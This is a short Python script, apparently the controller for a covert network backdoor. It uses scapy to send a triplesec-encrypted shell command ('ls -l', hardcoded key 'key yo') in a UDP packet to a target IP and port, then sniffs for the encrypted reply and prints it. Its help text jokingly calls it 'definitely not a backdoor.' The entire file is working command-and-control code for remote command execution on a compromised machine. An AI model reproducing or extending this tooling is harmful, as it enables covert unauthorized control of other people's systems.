from scapy.all import *
import argparse
import triplesec

def packetFunc(packet):
  encryptedData = packet['Raw'].load
  data = triplesec.decrypt(encryptedData, b'key yo').decode()
  print data


parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
parser.add_argument('-s'
                   , '--sport'
                   , dest='sourcePort'
                   , help='Source port of packets to send.'
                   , required=True)
parser.add_argument('-d'
                   , '--dport'
                   , dest='destPort'
                   , help='Destination port of packets to send.'
                   , required=True)
parser.add_argument('-ip'
                   , '--destIP'
                   , dest='destIP'
                   , help='Destination IP'
                   , required=True)
args = parser.parse_args()

command = "ls -l"
encryptedCommand = triplesec.encrypt(command, b'key yo')
sniffFilter = 'udp and dst port {0} and src port {1}' .format(args.sourcePort, args.destPort)
packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=encryptedCommand)
send(packet)
sniff(filter=sniffFilter,prn=packetFunc, count=1)
